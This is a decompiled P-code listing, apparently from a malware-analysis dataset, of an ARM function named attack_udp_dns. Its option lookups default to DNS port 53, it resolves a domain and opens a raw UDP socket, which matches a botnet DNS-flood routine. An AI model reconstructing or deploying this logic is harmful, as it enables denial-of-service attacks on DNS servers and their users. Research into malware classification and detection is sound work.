Label: 856
Function: attack_udp_dns
Architecture: arm
Source File: Unknown
Entry Point: 00019540

High-level P-code:

(register, 0x2c, 4) INT_ZEXT (register, 0x20, 1)
(unique, 0x1000021d, 4) CALL (ram, 0x26a60, 8) , (register, 0x2c, 4) , (const, 0x4, 4)
(ram, 0x19cb0, 4) INDIRECT (ram, 0x19cb0, 4) , (const, 0x3d, 4)
(stack, 0xffffffffffffff9c, 4) INDIRECT (stack, 0xffffffffffffff9c, 4) , (const, 0x5f, 4)
(stack, 0xffffffffffffffa0, 4) INDIRECT (stack, 0xffffffffffffffa0, 4) , (const, 0x5f, 4)
(stack, 0xffffffffffffffa4, 4) INDIRECT (stack, 0xffffffffffffffa4, 4) , (const, 0x5f, 4)
(stack, 0xffffffffffffffa8, 4) INDIRECT (stack, 0xffffffffffffffa8, 4) , (const, 0x5f, 4)
(stack, 0xffffffffffffffe0, 4) INDIRECT (register, 0x20, 4) , (const, 0x5f, 4)
(stack, 0xffffffffffffffe4, 4) INDIRECT (stack, 0xffffffffffffffe4, 4) , (const, 0x5f, 4)
(stack, 0xffffffffffffffea, 1) INDIRECT (stack, 0xffffffffffffffea, 1) , (const, 0x5f, 4)
(stack, 0xffffffffffffffeb, 1) INDIRECT (stack, 0xffffffffffffffeb, 1) , (const, 0x5f, 4)
(stack, 0xffffffffffffffec, 4) INDIRECT (stack, 0xffffffffffffffec, 4) , (const, 0x5f, 4)
(unique, 0x70d00, 1) SUBPIECE (register, 0x20, 4) , (const, 0x0, 4)
(register, 0x20, 4) CALL (ram, 0x16a74, 8) , (register, 0x28, 1) , (register, 0x2c, 4) , (const, 0x3, 1) , (ram, 0x19cb0, 4)
(ram, 0x19cb0, 4) INDIRECT (ram, 0x19cb0, 4) , (const, 0x77, 4)
(ram, 0x19cb4, 4) INDIRECT (ram, 0x19cb4, 4) , (const, 0x77, 4)
(stack, 0xffffffffffffff98, 4) INDIRECT (stack, 0xffffffffffffff98, 4) , (const, 0x77, 4)
(stack, 0xffffffffffffff9c, 4) INDIRECT (stack, 0xffffffffffffff9c, 4) , (const, 0x77, 4)
(stack, 0xffffffffffffffa0, 4) INDIRECT (stack, 0xffffffffffffffa0, 4) , (const, 0x77, 4)
(stack, 0xffffffffffffffa4, 4) INDIRECT (stack, 0xffffffffffffffa4, 4) , (const, 0x77, 4)
(stack, 0xffffffffffffffa8, 4) INDIRECT (stack, 0xffffffffffffffa8, 4) , (const, 0x77, 4)
(stack, 0xffffffffffffffdf, 1) INDIRECT (unique, 0x70d00, 1) , (const, 0x77, 4)
(stack, 0xffffffffffffffe0, 4) INDIRECT (stack, 0xffffffffffffffe0, 4) , (const, 0x77, 4)
(stack, 0xffffffffffffffe4, 4) INDIRECT (stack, 0xffffffffffffffe4, 4) , (const, 0x77, 4)
(stack, 0xffffffffffffffea, 1) INDIRECT (stack, 0xffffffffffffffea, 1) , (const, 0x77, 4)
(stack, 0xffffffffffffffeb, 1) INDIRECT (stack, 0xffffffffffffffeb, 1) , (const, 0x77, 4)
(stack, 0xffffffffffffffec, 4) INDIRECT (stack, 0xffffffffffffffec, 4) , (const, 0x77, 4)
(unique, 0x70f00, 2) SUBPIECE (register, 0x20, 4) , (const, 0x0, 4)
(register, 0x20, 4) CALL (ram, 0x16a74, 8) , (register, 0x28, 1) , (register, 0x2c, 4) , (const, 0x4, 1) , (const, 0x40, 4)
(ram, 0x19cb0, 4) INDIRECT (ram, 0x19cb0, 4) , (const, 0x9a, 4)
(ram, 0x19cb4, 4) INDIRECT (ram, 0x19cb4, 4) , (const, 0x9a, 4)
(stack, 0xffffffffffffff98, 4) INDIRECT (stack, 0xffffffffffffff98, 4) , (const, 0x9a, 4)
(stack, 0xffffffffffffff9c, 4) INDIRECT (stack, 0xffffffffffffff9c, 4) , (const, 0x9a, 4)
(stack, 0xffffffffffffffa0, 4) INDIRECT (stack, 0xffffffffffffffa0, 4) , (const, 0x9a, 4)
(stack, 0xffffffffffffffa4, 4) INDIRECT (stack, 0xffffffffffffffa4, 4) , (const, 0x9a, 4)
(stack, 0xffffffffffffffa8, 4) INDIRECT (stack, 0xffffffffffffffa8, 4) , (const, 0x9a, 4)
(stack, 0xffffffffffffffdc, 2) INDIRECT (unique, 0x70f00, 2) , (const, 0x9a, 4)
(stack, 0xffffffffffffffdf, 1) INDIRECT (stack, 0xffffffffffffffdf, 1) , (const, 0x9a, 4)
(stack, 0xffffffffffffffe0, 4) INDIRECT (stack, 0xffffffffffffffe0, 4) , (const, 0x9a, 4)
(stack, 0xffffffffffffffe4, 4) INDIRECT (stack, 0xffffffffffffffe4, 4) , (const, 0x9a, 4)
(stack, 0xffffffffffffffea, 1) INDIRECT (stack, 0xffffffffffffffea, 1) , (const, 0x9a, 4)
(stack, 0xffffffffffffffeb, 1) INDIRECT (stack, 0xffffffffffffffeb, 1) , (const, 0x9a, 4)
(stack, 0xffffffffffffffec, 4) INDIRECT (stack, 0xffffffffffffffec, 4) , (const, 0x9a, 4)
(unique, 0x70d00, 1) SUBPIECE (register, 0x20, 4) , (const, 0x0, 4)
(register, 0x20, 4) CALL (ram, 0x16a74, 8) , (register, 0x28, 1) , (register, 0x2c, 4) , (const, 0x5, 1) , (const, 0x0, 4)
(ram, 0x19cb0, 4) INDIRECT (ram, 0x19cb0, 4) , (const, 0xbd, 4)
(ram, 0x19cb4, 4) INDIRECT (ram, 0x19cb4, 4) , (const, 0xbd, 4)
(stack, 0xffffffffffffff98, 4) INDIRECT (stack, 0xffffffffffffff98, 4) , (const, 0xbd, 4)
(stack, 0xffffffffffffff9c, 4) INDIRECT (stack, 0xffffffffffffff9c, 4) , (const, 0xbd, 4)
(stack, 0xffffffffffffffa0, 4) INDIRECT (stack, 0xffffffffffffffa0, 4) , (const, 0xbd, 4)
(stack, 0xffffffffffffffa4, 4) INDIRECT (stack, 0xffffffffffffffa4, 4) , (const, 0xbd, 4)
(stack, 0xffffffffffffffa8, 4) INDIRECT (stack, 0xffffffffffffffa8, 4) , (const, 0xbd, 4)
(stack, 0xffffffffffffffdb, 1) INDIRECT (unique, 0x70d00, 1) , (const, 0xbd, 4)
(stack, 0xffffffffffffffdc, 2) INDIRECT (stack, 0xffffffffffffffdc, 2) , (const, 0xbd, 4)
(stack, 0xffffffffffffffdf, 1) INDIRECT (stack, 0xffffffffffffffdf, 1) , (const, 0xbd, 4)
(stack, 0xffffffffffffffe0, 4) INDIRECT (stack, 0xffffffffffffffe0, 4) , (const, 0xbd, 4)
(stack, 0xffffffffffffffe4, 4) INDIRECT (stack, 0xffffffffffffffe4, 4) , (const, 0xbd, 4)
(stack, 0xffffffffffffffea, 1) INDIRECT (stack, 0xffffffffffffffea, 1) , (const, 0xbd, 4)
(stack, 0xffffffffffffffeb, 1) INDIRECT (stack, 0xffffffffffffffeb, 1) , (const, 0xbd, 4)
(stack, 0xffffffffffffffec, 4) INDIRECT (stack, 0xffffffffffffffec, 4) , (const, 0xbd, 4)
(unique, 0x70d00, 1) SUBPIECE (register, 0x20, 4) , (const, 0x0, 4)
(register, 0x20, 4) CALL (ram, 0x16a74, 8) , (register, 0x28, 1) , (register, 0x2c, 4) , (const, 0x6, 1) , (ram, 0x19cb0, 4)
(ram, 0x19cb0, 4) INDIRECT (ram, 0x19cb0, 4) , (const, 0xd5, 4)
(ram, 0x19cb4, 4) INDIRECT (ram, 0x19cb4, 4) , (const, 0xd5, 4)
(stack, 0xffffffffffffff98, 4) INDIRECT (stack, 0xffffffffffffff98, 4) , (const, 0xd5, 4)
(stack, 0xffffffffffffff9c, 4) INDIRECT (stack, 0xffffffffffffff9c, 4) , (const, 0xd5, 4)
(stack, 0xffffffffffffffa0, 4) INDIRECT (stack, 0xffffffffffffffa0, 4) , (const, 0xd5, 4)
(stack, 0xffffffffffffffa4, 4) INDIRECT (stack, 0xffffffffffffffa4, 4) , (const, 0xd5, 4)
(stack, 0xffffffffffffffa8, 4) INDIRECT (stack, 0xffffffffffffffa8, 4) , (const, 0xd5, 4)
(stack, 0xffffffffffffffda, 1) INDIRECT (unique, 0x70d00, 1) , (const, 0xd5, 4)
(stack, 0xffffffffffffffdb, 1) INDIRECT (stack, 0xffffffffffffffdb, 1) , (const, 0xd5, 4)
(stack, 0xffffffffffffffdc, 2) INDIRECT (stack, 0xffffffffffffffdc, 2) , (const, 0xd5, 4)
(stack, 0xffffffffffffffdf, 1) INDIRECT (stack, 0xffffffffffffffdf, 1) , (const, 0xd5, 4)
(stack, 0xffffffffffffffe0, 4) INDIRECT (stack, 0xffffffffffffffe0, 4) , (const, 0xd5, 4)
(stack, 0xffffffffffffffe4, 4) INDIRECT (stack, 0xffffffffffffffe4, 4) , (const, 0xd5, 4)
(stack, 0xffffffffffffffea, 1) INDIRECT (stack, 0xffffffffffffffea, 1) , (const, 0xd5, 4)
(stack, 0xffffffffffffffeb, 1) INDIRECT (stack, 0xffffffffffffffeb, 1) , (const, 0xd5, 4)
(stack, 0xffffffffffffffec, 4) INDIRECT (stack, 0xffffffffffffffec, 4) , (const, 0xd5, 4)
(unique, 0x70f00, 2) SUBPIECE (register, 0x20, 4) , (const, 0x0, 4)
(register, 0x20, 4) CALL (ram, 0x16a74, 8) , (register, 0x28, 1) , (register, 0x2c, 4) , (const, 0x7, 1) , (const, 0x35, 4)
(ram, 0x19cb0, 4) INDIRECT (ram, 0x19cb0, 4) , (const, 0xf8, 4)
(ram, 0x19cb4, 4) INDIRECT (ram, 0x19cb4, 4) , (const, 0xf8, 4)
(stack, 0xffffffffffffff98, 4) INDIRECT (stack, 0xffffffffffffff98, 4) , (const, 0xf8, 4)
(stack, 0xffffffffffffff9c, 4) INDIRECT (stack, 0xffffffffffffff9c, 4) , (const, 0xf8, 4)
(stack, 0xffffffffffffffa0, 4) INDIRECT (stack, 0xffffffffffffffa0, 4) , (const, 0xf8, 4)
(stack, 0xffffffffffffffa4, 4) INDIRECT (stack, 0xffffffffffffffa4, 4) , (const, 0xf8, 4)
(stack, 0xffffffffffffffa8, 4) INDIRECT (stack, 0xffffffffffffffa8, 4) , (const, 0xf8, 4)
(stack, 0xffffffffffffffd8, 2) INDIRECT (unique, 0x70f00, 2) , (const, 0xf8, 4)
(stack, 0xffffffffffffffda, 1) INDIRECT (stack, 0xffffffffffffffda, 1) , (const, 0xf8, 4)
(stack, 0xffffffffffffffdb, 1) INDIRECT (stack, 0xffffffffffffffdb, 1) , (const, 0xf8, 4)
(stack, 0xffffffffffffffdc, 2) INDIRECT (stack, 0xffffffffffffffdc, 2) , (const, 0xf8, 4)
(stack, 0xffffffffffffffdf, 1) INDIRECT (stack, 0xffffffffffffffdf, 1) , (const, 0xf8, 4)
(stack, 0xffffffffffffffe0, 4) INDIRECT (stack, 0xffffffffffffffe0, 4) , (const, 0xf8, 4)
(stack, 0xffffffffffffffe4, 4) INDIRECT (stack, 0xffffffffffffffe4, 4) , (const, 0xf8, 4)
(stack, 0xffffffffffffffea, 1) INDIRECT (stack, 0xffffffffffffffea, 1) , (const, 0xf8, 4)
(stack, 0xffffffffffffffeb, 1) INDIRECT (stack, 0xffffffffffffffeb, 1) , (const, 0xf8, 4)
(stack, 0xffffffffffffffec, 4) INDIRECT (stack, 0xffffffffffffffec, 4) , (const, 0xf8, 4)
(unique, 0x70f00, 2) SUBPIECE (register, 0x20, 4) , (const, 0x0, 4)
(register, 0x20, 4) CALL (ram, 0x16a74, 8) , (register, 0x28, 1) , (register, 0x2c, 4) , (const, 0x9, 1) , (ram, 0x19cb0, 4)
(ram, 0x19cb0, 4) INDIRECT (ram, 0x19cb0, 4) , (const, 0x110, 4)
(ram, 0x19cb4, 4) INDIRECT (ram, 0x19cb4, 4) , (const, 0x110, 4)
(stack, 0xffffffffffffff98, 4) INDIRECT (stack, 0xffffffffffffff98, 4) , (const, 0x110, 4)
(stack, 0xffffffffffffff9c, 4) INDIRECT (stack, 0xffffffffffffff9c, 4) , (const, 0x110, 4)
(stack, 0xffffffffffffffa0, 4) INDIRECT (stack, 0xffffffffffffffa0, 4) , (const, 0x110, 4)
(stack, 0xffffffffffffffa4, 4) INDIRECT (stack, 0xffffffffffffffa4, 4) , (const, 0x110, 4)
(stack, 0xffffffffffffffa8, 4) INDIRECT (stack, 0xffffffffffffffa8, 4) , (const, 0x110, 4)
(stack, 0xffffffffffffffd6, 2) INDIRECT (unique, 0x70f00, 2) , (const, 0x110, 4)
(stack, 0xffffffffffffffd8, 2) INDIRECT (stack, 0xffffffffffffffd8, 2) , (const, 0x110, 4)
(stack, 0xffffffffffffffda, 1) INDIRECT (stack, 0xffffffffffffffda, 1) , (const, 0x110, 4)
(stack, 0xffffffffffffffdb, 1) INDIRECT (stack, 0xffffffffffffffdb, 1) , (const, 0x110, 4)
(stack, 0xffffffffffffffdc, 2) INDIRECT (stack, 0xffffffffffffffdc, 2) , (const, 0x110, 4)
(stack, 0xffffffffffffffdf, 1) INDIRECT (stack, 0xffffffffffffffdf, 1) , (const, 0x110, 4)
(stack, 0xffffffffffffffe0, 4) INDIRECT (stack, 0xffffffffffffffe0, 4) , (const, 0x110, 4)
(stack, 0xffffffffffffffe4, 4) INDIRECT (stack, 0xffffffffffffffe4, 4) , (const, 0x110, 4)
(stack, 0xffffffffffffffea, 1) INDIRECT (stack, 0xffffffffffffffea, 1) , (const, 0x110, 4)
(stack, 0xffffffffffffffeb, 1) INDIRECT (stack, 0xffffffffffffffeb, 1) , (const, 0x110, 4)
(stack, 0xffffffffffffffec, 4) INDIRECT (stack, 0xffffffffffffffec, 4) , (const, 0x110, 4)
(unique, 0x70f00, 2) SUBPIECE (register, 0x20, 4) , (const, 0x0, 4)
(register, 0x20, 4) CALL (ram, 0x16a74, 8) , (register, 0x28, 1) , (register, 0x2c, 4) , (const, 0x0, 1) , (const, 0xc, 4)
(ram, 0x19cb0, 4) INDIRECT (ram, 0x19cb0, 4) , (const, 0x133, 4)
(ram, 0x19cb4, 4) INDIRECT (ram, 0x19cb4, 4) , (const, 0x133, 4)
(stack, 0xffffffffffffff98, 4) INDIRECT (stack, 0xffffffffffffff98, 4) , (const, 0x133, 4)
(stack, 0xffffffffffffff9c, 4) INDIRECT (stack, 0xffffffffffffff9c, 4) , (const, 0x133, 4)
(stack, 0xffffffffffffffa0, 4) INDIRECT (stack, 0xffffffffffffffa0, 4) , (const, 0x133, 4)
(stack, 0xffffffffffffffa4, 4) INDIRECT (stack, 0xffffffffffffffa4, 4) , (const, 0x133, 4)
(stack, 0xffffffffffffffa8, 4) INDIRECT (stack, 0xffffffffffffffa8, 4) , (const, 0x133, 4)
(stack, 0xffffffffffffffd4, 2) INDIRECT (unique, 0x70f00, 2) , (const, 0x133, 4)
(stack, 0xffffffffffffffd6, 2) INDIRECT (stack, 0xffffffffffffffd6, 2) , (const, 0x133, 4)
(stack, 0xffffffffffffffd8, 2) INDIRECT (stack, 0xffffffffffffffd8, 2) , (const, 0x133, 4)
(stack, 0xffffffffffffffda, 1) INDIRECT (stack, 0xffffffffffffffda, 1) , (const, 0x133, 4)
(stack, 0xffffffffffffffdb, 1) INDIRECT (stack, 0xffffffffffffffdb, 1) , (const, 0x133, 4)
(stack, 0xffffffffffffffdc, 2) INDIRECT (stack, 0xffffffffffffffdc, 2) , (const, 0x133, 4)
(stack, 0xffffffffffffffdf, 1) INDIRECT (stack, 0xffffffffffffffdf, 1) , (const, 0x133, 4)
(stack, 0xffffffffffffffe0, 4) INDIRECT (stack, 0xffffffffffffffe0, 4) , (const, 0x133, 4)
(stack, 0xffffffffffffffe4, 4) INDIRECT (stack, 0xffffffffffffffe4, 4) , (const, 0x133, 4)
(stack, 0xffffffffffffffea, 1) INDIRECT (stack, 0xffffffffffffffea, 1) , (const, 0x133, 4)
(stack, 0xffffffffffffffeb, 1) INDIRECT (stack, 0xffffffffffffffeb, 1) , (const, 0x133, 4)
(stack, 0xffffffffffffffec, 4) INDIRECT (stack, 0xffffffffffffffec, 4) , (const, 0x133, 4)
(unique, 0x70d00, 1) SUBPIECE (register, 0x20, 4) , (const, 0x0, 4)
(register, 0x20, 4) CALL (ram, 0x169dc, 8) , (register, 0x28, 1) , (register, 0x2c, 4) , (const, 0x8, 1) , (const, 0x0, 4)
(ram, 0x19cb0, 4) INDIRECT (ram, 0x19cb0, 4) , (const, 0x156, 4)
(ram, 0x19cb4, 4) INDIRECT (ram, 0x19cb4, 4) , (const, 0x156, 4)
(stack, 0xffffffffffffff98, 4) INDIRECT (stack, 0xffffffffffffff98, 4) , (const, 0x156, 4)
(stack, 0xffffffffffffff9c, 4) INDIRECT (stack, 0xffffffffffffff9c, 4) , (const, 0x156, 4)
(stack, 0xffffffffffffffa0, 4) INDIRECT (stack, 0xffffffffffffffa0, 4) , (const, 0x156, 4)
(stack, 0xffffffffffffffa4, 4) INDIRECT (stack, 0xffffffffffffffa4, 4) , (const, 0x156, 4)
(stack, 0xffffffffffffffa8, 4) INDIRECT (stack, 0xffffffffffffffa8, 4) , (const, 0x156, 4)
(stack, 0xffffffffffffffd3, 1) INDIRECT (unique, 0x70d00, 1) , (const, 0x156, 4)
(stack, 0xffffffffffffffd4, 2) INDIRECT (stack, 0xffffffffffffffd4, 2) , (const, 0x156, 4)
(stack, 0xffffffffffffffd6, 2) INDIRECT (stack, 0xffffffffffffffd6, 2) , (const, 0x156, 4)
(stack, 0xffffffffffffffd8, 2) INDIRECT (stack, 0xffffffffffffffd8, 2) , (const, 0x156, 4)
(stack, 0xffffffffffffffda, 1) INDIRECT (stack, 0xffffffffffffffda, 1) , (const, 0x156, 4)
(stack, 0xffffffffffffffdb, 1) INDIRECT (stack, 0xffffffffffffffdb, 1) , (const, 0x156, 4)
(stack, 0xffffffffffffffdc, 2) INDIRECT (stack, 0xffffffffffffffdc, 2) , (const, 0x156, 4)
(stack, 0xffffffffffffffdf, 1) INDIRECT (stack, 0xffffffffffffffdf, 1) , (const, 0x156, 4)
(stack, 0xffffffffffffffe0, 4) INDIRECT (stack, 0xffffffffffffffe0, 4) , (const, 0x156, 4)
(stack, 0xffffffffffffffe4, 4) INDIRECT (stack, 0xffffffffffffffe4, 4) , (const, 0x156, 4)
(stack, 0xffffffffffffffea, 1) INDIRECT (stack, 0xffffffffffffffea, 1) , (const, 0x156, 4)
(stack, 0xffffffffffffffeb, 1) INDIRECT (stack, 0xffffffffffffffeb, 1) , (const, 0x156, 4)
(stack, 0xffffffffffffffec, 4) INDIRECT (stack, 0xffffffffffffffec, 4) , (const, 0x156, 4)
(register, 0x20, 4) CALL (ram, 0x1a098, 8)
(ram, 0x19cb0, 4) INDIRECT (ram, 0x19cb0, 4) , (const, 0x15a, 4)
(ram, 0x19cb4, 4) INDIRECT (ram, 0x19cb4, 4) , (const, 0x15a, 4)
(stack, 0xffffffffffffff98, 4) INDIRECT (stack, 0xffffffffffffff98, 4) , (const, 0x15a, 4)
(stack, 0xffffffffffffff9c, 4) INDIRECT (stack, 0xffffffffffffff9c, 4) , (const, 0x15a, 4)
(stack, 0xffffffffffffffa0, 4) INDIRECT (stack, 0xffffffffffffffa0, 4) , (const, 0x15a, 4)
(stack, 0xffffffffffffffa4, 4) INDIRECT (stack, 0xffffffffffffffa4, 4) , (const, 0x15a, 4)
(stack, 0xffffffffffffffa8, 4) INDIRECT (stack, 0xffffffffffffffa8, 4) , (const, 0x15a, 4)
(stack, 0xffffffffffffffcc, 4) INDIRECT (register, 0x20, 4) , (const, 0x15a, 4)
(stack, 0xffffffffffffffd3, 1) INDIRECT (stack, 0xffffffffffffffd3, 1) , (const, 0x15a, 4)
(stack, 0xffffffffffffffd4, 2) INDIRECT (stack, 0xffffffffffffffd4, 2) , (const, 0x15a, 4)
(stack, 0xffffffffffffffd6, 2) INDIRECT (stack, 0xffffffffffffffd6, 2) , (const, 0x15a, 4)
(stack, 0xffffffffffffffd8, 2) INDIRECT (stack, 0xffffffffffffffd8, 2) , (const, 0x15a, 4)
(stack, 0xffffffffffffffda, 1) INDIRECT (stack, 0xffffffffffffffda, 1) , (const, 0x15a, 4)
(stack, 0xffffffffffffffdb, 1) INDIRECT (stack, 0xffffffffffffffdb, 1) , (const, 0x15a, 4)
(stack, 0xffffffffffffffdc, 2) INDIRECT (stack, 0xffffffffffffffdc, 2) , (const, 0x15a, 4)
(stack, 0xffffffffffffffdf, 1) INDIRECT (stack, 0xffffffffffffffdf, 1) , (const, 0x15a, 4)
(stack, 0xffffffffffffffe0, 4) INDIRECT (stack, 0xffffffffffffffe0, 4) , (const, 0x15a, 4)
(stack, 0xffffffffffffffe4, 4) INDIRECT (stack, 0xffffffffffffffe4, 4) , (const, 0x15a, 4)
(stack, 0xffffffffffffffea, 1) INDIRECT (stack, 0xffffffffffffffea, 1) , (const, 0x15a, 4)
(stack, 0xffffffffffffffeb, 1) INDIRECT (stack, 0xffffffffffffffeb, 1) , (const, 0x15a, 4)
(stack, 0xffffffffffffffec, 4) INDIRECT (stack, 0xffffffffffffffec, 4) , (const, 0x15a, 4)
(register, 0x65, 1) INT_NOTEQUAL (stack, 0xffffffffffffffcc, 4) , (const, 0x0, 4)
 ---  CBRANCH (ram, 0x19c9c, 1) , (register, 0x65, 1)
(register, 0x20, 4) CALL (ram, 0x1dea8, 8) , (stack, 0xffffffffffffffcc, 4)
(ram, 0x19cb0, 4) INDIRECT (ram, 0x19cb0, 4) , (const, 0x173, 4)
(ram, 0x19cb4, 4) INDIRECT (ram, 0x19cb4, 4) , (const, 0x173, 4)
(stack, 0xffffffffffffff98, 4) INDIRECT (stack, 0xffffffffffffff98, 4) , (const, 0x173, 4)
(stack, 0xffffffffffffff9c, 4) INDIRECT (stack, 0xffffffffffffff9c, 4) , (const, 0x173, 4)
(stack, 0xffffffffffffffa0, 4) INDIRECT (stack, 0xffffffffffffffa0, 4) , (const, 0x173, 4)
(stack, 0xffffffffffffffa4, 4) INDIRECT (stack, 0xffffffffffffffa4, 4) , (const, 0x173, 4)
(stack, 0xffffffffffffffa8, 4) INDIRECT (stack, 0xffffffffffffffa8, 4) , (const, 0x173, 4)
(stack, 0xffffffffffffffc8, 4) INDIRECT (register, 0x20, 4) , (const, 0x173, 4)
(stack, 0xffffffffffffffcc, 4) INDIRECT (stack, 0xffffffffffffffcc, 4) , (const, 0x173, 4)
(stack, 0xffffffffffffffd3, 1) INDIRECT (stack, 0xffffffffffffffd3, 1) , (const, 0x173, 4)
(stack, 0xffffffffffffffd4, 2) INDIRECT (stack, 0xffffffffffffffd4, 2) , (const, 0x173, 4)
(stack, 0xffffffffffffffd6, 2) INDIRECT (stack, 0xffffffffffffffd6, 2) , (const, 0x173, 4)
(stack, 0xffffffffffffffd8, 2) INDIRECT (stack, 0xffffffffffffffd8, 2) , (const, 0x173, 4)
(stack, 0xffffffffffffffda, 1) INDIRECT (stack, 0xffffffffffffffda, 1) , (const, 0x173, 4)
(stack, 0xffffffffffffffdb, 1) INDIRECT (stack, 0xffffffffffffffdb, 1) , (const, 0x173, 4)
(stack, 0xffffffffffffffdc, 2) INDIRECT (stack, 0xffffffffffffffdc, 2) , (const, 0x173, 4)
(stack, 0xffffffffffffffdf, 1) INDIRECT (stack, 0xffffffffffffffdf, 1) , (const, 0x173, 4)
(stack, 0xffffffffffffffe0, 4) INDIRECT (stack, 0xffffffffffffffe0, 4) , (const, 0x173, 4)
(stack, 0xffffffffffffffe4, 4) INDIRECT (stack, 0xffffffffffffffe4, 4) , (const, 0x173, 4)
(stack, 0xffffffffffffffea, 1) INDIRECT (stack, 0xffffffffffffffea, 1) , (const, 0x173, 4)
(stack, 0xffffffffffffffeb, 1) INDIRECT (stack, 0xffffffffffffffeb, 1) , (const, 0x173, 4)
(stack, 0xffffffffffffffec, 4) INDIRECT (stack, 0xffffffffffffffec, 4) , (const, 0x173, 4)
(register, 0x20, 4) CALL (ram, 0x2bbc0, 8) , (const, 0x2, 4) , (const, 0x3, 4) , (const, 0x11, 4)
(ram, 0x19cb0, 4) INDIRECT (ram, 0x19cb0, 4) , (const, 0x19b, 4)
(ram, 0x19cb4, 4) INDIRECT (ram, 0x19cb4, 4) , (const, 0x19b, 4)
(stack, 0xffffffffffffff98, 4) INDIRECT (stack, 0xffffffffffffff98, 4) , (const, 0x19b, 4)
(stack, 0xffffffffffffff9c, 4) INDIRECT (stack, 0xffffffffffffff9c, 4) , (const, 0x19b, 4)
(stack, 0xffffffffffffffa0, 4) INDIRECT (stack, 0xffffffffffffffa0, 4) , (const, 0x19b, 4)
(stack, 0xffffffffffffffa4, 4) INDIRECT (stack, 0xffffffffffffffa4, 4) , (const, 0x19b, 4)
(stack, 0xffffffffffffffa8, 4) INDIRECT (stack, 0xffffffffffffffa8, 4) , (const, 0x19b, 4)
(stack, 0xffffffffffffffc4, 4) INDIRECT (register, 0x20, 4) , (const, 0x19b, 4)
(stack, 0xffffffffffffffc8, 4) INDIRECT (stack, 0xffffffffffffffc8, 4) , (const, 0x19b, 4)
(stack, 0xffffffffffffffcc, 4) INDIRECT (stack, 0xffffffffffffffcc, 4) , (const, 0x19b, 4)
(stack, 0xffffffffffffffd3, 1) INDIRECT (stack, 0xffffffffffffffd3, 1) , (const, 0x19b, 4)
(stack, 0xffffffffffffffd4, 2) INDIRECT (stack, 0xffffffffffffffd4, 2) , (const, 0x19b, 4)
(stack, 0xffffffffffffffd6, 2) INDIRECT (stack, 0xffffffffffffffd6, 2) , (const, 0x19b, 4)
(stack, 0xffffffffffffffd8, 2) INDIRECT (stack, 0xffffffffffffffd8, 2) , (const, 0x19b, 4)
(stack, 0xffffffffffffffda, 1) INDIRECT (stack, 0xffffffffffffffda, 1) , (const, 0x19b, 4)
(stack, 0xffffffffffffffdb, 1) INDIRECT (stack, 0xffffffffffffffdb, 1) , (const, 0x19b, 4)
